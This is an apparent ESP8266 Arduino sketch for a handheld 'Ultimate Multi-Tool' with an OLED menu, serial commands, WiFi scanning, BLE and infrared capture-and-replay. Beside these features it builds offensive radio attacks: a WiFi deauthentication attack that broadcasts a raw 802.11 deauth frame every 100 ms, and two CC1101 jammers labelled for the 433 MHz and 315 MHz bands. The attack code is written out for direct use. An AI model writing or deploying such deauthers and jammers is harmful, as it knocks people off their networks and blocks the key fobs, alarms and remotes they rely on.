#include <ESP8266WiFi.h>
#include <SPI.h>
#include <Wire.h>
#include <SoftwareSerial.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <IRremoteESP8266.h>
#include <IRrecv.h>
#include <IRsend.h>
#include <IRutils.h>

// --- OLED SETUP ---
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET -1
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);

// --- HM-10 BLE SOFTWARE SERIAL SETUP ---
const int BLE_RX = D5; // Connects to HM-10 TX
const int BLE_TX = D6; // Connects to HM-10 RX
SoftwareSerial BTSerial(BLE_RX, BLE_TX);

// --- CUSTOM BITMAP LOGO (128x64 pixels) ---
const unsigned char PROGMEM custom_logo[] = {
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
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  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

// --- PIN ASSIGNMENTS ---
const int CC1101_CSN_1 = D8;            // GPIO 15
const int CC1101_CSN_2 = D4;            // GPIO 2

// Buttons & Peripherals
const int BTN_NEXT     = D0;            // GPIO 16
const int BTN_PREV     = D3;            // GPIO 0
const int BTN_SELECT   = 3;             // GPIO 3 (RX Pin)
const int IR_RECV_PIN  = D7;            // GPIO 13 (IR Receiver Module)
const int IR_LED_PIN   = D9;            // GPIO 9  (IR Transmitter LED)

// --- IR & STATE OBJECTS ---
IRrecv irrecv(IR_RECV_PIN);
IRsend irsend(IR_LED_PIN);
decode_results irResults;

unsigned long lastButtonCheck = 0;
const int debounceDelay = 200;
int currentMenu = 0; 
const int totalMenus = 9; // Total menu screens (0 to 8)

bool isJamming1 = false;
bool isJamming2 = false;
bool isDeauthing = false;
unsigned long lastDeauthPacket = 0;

// Standard IEEE 802.11 Deauthentication Frame Template
uint8_t broadcastPacket[26] = {
  0xC0, 0x00, 0x3A, 0x01, 0xCC, 0xCC, 0xCC, 0xCC, 
  0xCC, 0xCC, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
  0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x00, 0x00, 
  0x01, 0x00
};

// Storage for captured IR code
uint64_t savedIRCode = 0;
int savedIRType = 0;
size_t savedIRBits = 0;
bool hasCapturedIR = false;

// Function Prototypes
void handleButtons();
void handleSerialCommands();
void runRFJammer(int csnPin);
void runDeauther();
void renderMenu();
void executeAction();
void wifiScanAction();
void captureIRAction();
void replayIRAction();
void bleBeaconAction();
void bleListenAction();
void updateDisplay(String line1, String line2);

void setup() {
  Serial.begin(115200);
  BTSerial.begin(9600); // HM-10 default baud rate
  delay(500);

  Serial.println(F("\n[INFO] Ultimate Multi-Tool + BLE Booting..."));

  // Pin Modes
  pinMode(BTN_NEXT, INPUT_PULLUP);
  pinMode(BTN_PREV, INPUT_PULLUP);
  pinMode(BTN_SELECT, INPUT_PULLUP);

  pinMode(CC1101_CSN_1, OUTPUT);
  pinMode(CC1101_CSN_2, OUTPUT);
  digitalWrite(CC1101_CSN_1, HIGH);
  digitalWrite(CC1101_CSN_2, HIGH);

  // Initialize Sub-systems
  SPI.begin();
  Wire.begin();
  irrecv.enableIRIn();
  irsend.begin();

  // OLED Init
  if(!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) { 
    Serial.println(F("[ERROR] OLED failed to start"));
  } else {
    display.clearDisplay();
    display.drawBitmap(0, 0, custom_logo, 128, 64, SSD1306_WHITE);
    display.display();
    delay(2500); 
  }

  WiFi.mode(WIFI_STA);
  WiFi.disconnect();

  delay(500);
  updateDisplay("Multi-Tool + BLE", "System Online");
}

void loop() {
  handleButtons();
  handleSerialCommands(); 

  if (isJamming1) runRFJammer(CC1101_CSN_1);
  if (isJamming2) runRFJammer(CC1101_CSN_2);
  
  if (isDeauthing) {
    if (millis() - lastDeauthPacket > 100) { 
      runDeauther();
      lastDeauthPacket = millis();
    }
  }
}

// --- SERIAL MONITOR CONTROL PARSER ---
void handleSerialCommands() {
  if (Serial.available() > 0) {
    String cmd = Serial.readStringUntil('\n');
    cmd.trim(); 

    if (cmd.equalsIgnoreCase("next")) {
      currentMenu = (currentMenu + 1) % totalMenus;
      renderMenu();
      Serial.print(F("[CMD] Menu: ")); Serial.println(currentMenu);
    }
    else if (cmd.equalsIgnoreCase("prev")) {
      currentMenu = (currentMenu - 1 < 0) ? totalMenus - 1 : currentMenu - 1;
      renderMenu();
      Serial.print(F("[CMD] Menu: ")); Serial.println(currentMenu);
    }
    else if (cmd.equalsIgnoreCase("select")) {
      executeAction();
    }
    else if (cmd.equalsIgnoreCase("scan")) {
      wifiScanAction();
    }
    else if (cmd.equalsIgnoreCase("jam1")) {
      isJamming1 = !isJamming1;
      Serial.print(F("[CMD] 433MHz Jammer 1: ")); Serial.println(isJamming1 ? "ACTIVE" : "STOPPED");
    }
    else if (cmd.equalsIgnoreCase("jam2")) {
      isJamming2 = !isJamming2;
      Serial.print(F("[CMD] 315MHz Jammer 2: ")); Serial.println(isJamming2 ? "ACTIVE" : "STOPPED");
    }
    else if (cmd.equalsIgnoreCase("blebeacon")) {
      bleBeaconAction();
    }
  }
}

// --- DIGITAL BUTTON NAVIGATION ---
void handleButtons() {
  if (millis() - lastButtonCheck > debounceDelay) {
    if (digitalRead(BTN_NEXT) == LOW) { 
      currentMenu = (currentMenu + 1) % totalMenus;
      renderMenu();
      lastButtonCheck = millis();
    } 
    else if (digitalRead(BTN_PREV) == LOW) { 
      currentMenu = (currentMenu - 1 < 0) ? totalMenus - 1 : currentMenu - 1;
      renderMenu();
      lastButtonCheck = millis();
    } 
    else if (digitalRead(BTN_SELECT) == LOW) { 
      executeAction();
      lastButtonCheck = millis();
    }
  }
}

// --- OLED DISPLAY UPDATER ---
void updateDisplay(String line1, String line2) {
  static String lastLine1 = "";
  static String lastLine2 = "";

  display.clearDisplay();
  display.setCursor(0,0);
  display.print(F("=== ULTIMATE TOOL ==="));
  display.setCursor(0, 16);
  display.println(line1);
  display.setCursor(0, 32);
  display.println(line2);
  display.setCursor(0, 52);
  display.print(F("Menu ID: ")); display.print(currentMenu);
  display.display();
  
  if (line1 != lastLine1 || line2 != lastLine2) {
    Serial.print(F("[OLED] ")); Serial.print(line1); Serial.print(" | "); Serial.println(line2);
    lastLine1 = line1;
    lastLine2 = line2;
  }
}

void renderMenu() {
  isJamming1 = false;
  isJamming2 = false;
  isDeauthing = false;

  switch(currentMenu) {
    case 0: updateDisplay("Home / Status", "Select to check"); break;
    case 1: updateDisplay("Mode: WiFi Scan", "Select to Scan"); break;
    case 2: updateDisplay("Mode: Deauth", "Select to Attack"); break;
    case 3: updateDisplay("IR: Read Remote", "Select to Capture"); break;
    case 4: updateDisplay("IR: Replay Signal", "Select to Blast"); break;
    case 5: updateDisplay("RF Jam: Mod 1", "Select for 433MHz"); break;
    case 6: updateDisplay("RF Jam: Mod 2", "Select for 315MHz"); break;
    case 7: updateDisplay("BLE: Beacon Mode", "Select to Broadcast"); break;
    case 8: updateDisplay("BLE: Read Serial", "Select to Listen"); break;
  }
}

// --- ACTION EXECUTOR ---
void executeAction() {
  if (currentMenu == 1) {
    wifiScanAction();
  } 
  else if (currentMenu == 2) {
    isDeauthing = !isDeauthing;
    if (isDeauthing) {
      updateDisplay("DEAUTH ACTIVE", "Spamming Frames!");
      Serial.println(F("[ATTACK] Deauth packet injection started."));
    } else {
      updateDisplay("Deauth Stopped", "Cycle Finished");
      Serial.println(F("[ATTACK] Deauth stopped."));
    }
  }
  else if (currentMenu == 3) {
    captureIRAction();
  }
  else if (currentMenu == 4) {
    replayIRAction();
  }
  else if (currentMenu == 5) {
    isJamming1 = !isJamming1;
    if (isJamming1) updateDisplay("JAMMING 433MHz", "Mod 1 Active!");
    else updateDisplay("433MHz Jammer", "Stopped");
  }
  else if (currentMenu == 6) {
    isJamming2 = !isJamming2;
    if (isJamming2) updateDisplay("JAMMING 315MHz", "Mod 2 Active!");
    else updateDisplay("315MHz Jammer", "Stopped");
  }
  else if (currentMenu == 7) {
    bleBeaconAction();
  }
  else if (currentMenu == 8) {
    bleListenAction();
  }
}

// --- FEATURE MODULES ---
void wifiScanAction() {
  updateDisplay("Scanning Air...", "Please wait");
  int n = WiFi.scanNetworks();
  String result = (n == 0) ? "No networks" : String(n) + " Found!";
  updateDisplay("Scan Complete", result);
  Serial.print(F("[SCAN] Networks discovered: ")); Serial.println(n);
  for (int i = 0; i < n; ++i) {
    Serial.print(i + 1); Serial.print(": "); Serial.print(WiFi.SSID(i));
    Serial.print(" ("); Serial.print(WiFi.RSSI(i)); Serial.println(" dBm)");
  }
}

void captureIRAction() {
  updateDisplay("Point & Press", "Waiting for IR...");
  unsigned long startTime = millis();
  
  while (millis() - startTime < 10000) { 
    if (irrecv.decode(&irResults)) {
      savedIRCode = irResults.value;
      savedIRType = irResults.decode_type;
      savedIRBits = irResults.bits;
      hasCapturedIR = true;

      String codeTypeStr = typeToString(irResults.decode_type);
      updateDisplay("IR Captured!", codeTypeStr);
      
      Serial.print(F("[IR] Captured Protocol: ")); Serial.print(codeTypeStr);
      Serial.print(" | Value: 0x"); Serial.println(savedIRCode, HEX);
      
      irrecv.resume();
      delay(2000);
      return;
    }
    yield();
  }
  updateDisplay("IR Timeout", "No signal found");
  delay(1500);
}

void replayIRAction() {
  if (!hasCapturedIR) {
    updateDisplay("No IR Saved", "Capture first!");
    delay(1500);
    return;
  }

  updateDisplay("Blasting IR...", "Transmitting");
  
  switch (savedIRType) {
    case NEC:
      irsend.sendNEC(savedIRCode, savedIRBits);
      break;
    case SONY:
      irsend.sendSony(savedIRCode, savedIRBits);
      break;
    case RC5:
      irsend.sendRC5(savedIRCode, savedIRBits);
      break;
    case RC6:
      irsend.sendRC6(savedIRCode, savedIRBits);
      break;
    default:
      irsend.send((decode_type_t)savedIRType, savedIRCode, savedIRBits);
      break;
  }

  delay(500);
  updateDisplay("IR Sent!", "Replay Complete");
  Serial.println(F("[IR] Replayed saved signal vector."));
  delay(1500);
}

void bleBeaconAction() {
  updateDisplay("Configuring BLE", "Setting Name...");
  BTSerial.print("AT+NAMEGizmoTool"); 
  delay(500);
  updateDisplay("BLE Beacon Active", "Broadcasting...");
  Serial.println(F("[BLE] HM-10 configured as beacon node."));
  delay(2000);
}

void bleListenAction() {
  updateDisplay("Listening BLE", "Check Serial Mon");
  unsigned long start = millis();
  while (millis() - start < 8000) {
    if (BTSerial.available()) {
      String incoming = BTSerial.readStringUntil('\n');
      Serial.print(F("[BLE RX]: ")); Serial.println(incoming);
      updateDisplay("BLE Data Read", incoming.substring(0, 16));
    }
    yield();
  }
}

void runRFJammer(int csnPin) {
  digitalWrite(csnPin, LOW);
  SPI.transfer(0x3B); 
  delayMicroseconds(10);
  SPI.transfer(0x02); 
  SPI.transfer(0x0E); 
  SPI.transfer(0x12); 
  SPI.transfer(0x30); 
  SPI.transfer(0x35); 
  digitalWrite(csnPin, HIGH);
  delay(50);
}

void runDeauther() {
  wifi_send_pkt_freedom(broadcastPacket, sizeof(broadcastPacket), 0);
  yield();
}